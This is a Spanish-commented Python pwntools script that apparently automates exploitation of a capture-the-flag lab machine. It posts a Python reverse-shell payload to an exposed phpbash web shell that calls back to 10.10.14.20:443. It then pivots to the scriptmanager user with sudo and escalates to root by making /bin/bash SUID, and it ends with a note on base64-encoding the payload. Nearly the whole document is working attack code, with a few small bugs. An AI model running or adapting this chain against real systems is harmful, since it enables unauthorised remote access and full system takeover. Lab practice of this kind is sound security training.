``` python

#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time
import threading

from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.68/dev/phpbash.php"
lport = 443

def makeRequest():
	
	post_data = {
		'cmd' : """cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'"""
	}
	
	r = requests.post(main_url, data=post_data)

if __name__ == '__main__':
	try:
		threading.Thread(target=makeRequest(), args=()).start()
	except Exception as e:
		log.error(str(e))
	
	p1 : log.process("Pwn")
	p1.status("Ganando acceso al sistema")
	
	shell = listen(lport, timeout=20).wait_for_connection()
	
	if shell.sock is None:
		p1.failure("No ha sido posible pwnear el sistema")
	else:
		p1.success("Se ha accedido al sistema com el usuario www-data")
	
	p2 = log.process("User pivoting")
	p2.status("Migrando al usuario scriptmanager")
	time.sleep(2)
	
	shell.sendline("sudo -u scriptmanager bash")
	
	p2.success("Migración al usuario scriptmanager satisfactoria")
	
	p3 = log.process("Privilege escalation")
	p3.status("Convirtiéndonos al usuario root")
	
	shell.sendline("python -c 'import os\nos.system('chmod 4775 /bin/bash')' > /scripts/test.py")
	time.sleep(60)
	shell.sendline("bash -p")
	
	p3.success("Se ha ganado acceso como root")
	
	shell.interactive()
```

Codificar instrucción:
	Fichero Bash_as_SUID.py --> `cat Bash_as_SUID.py |  base64`
	En el script --> `shell.sendline("echo <base64_hash> | base64 -d > /scripts/test.py")`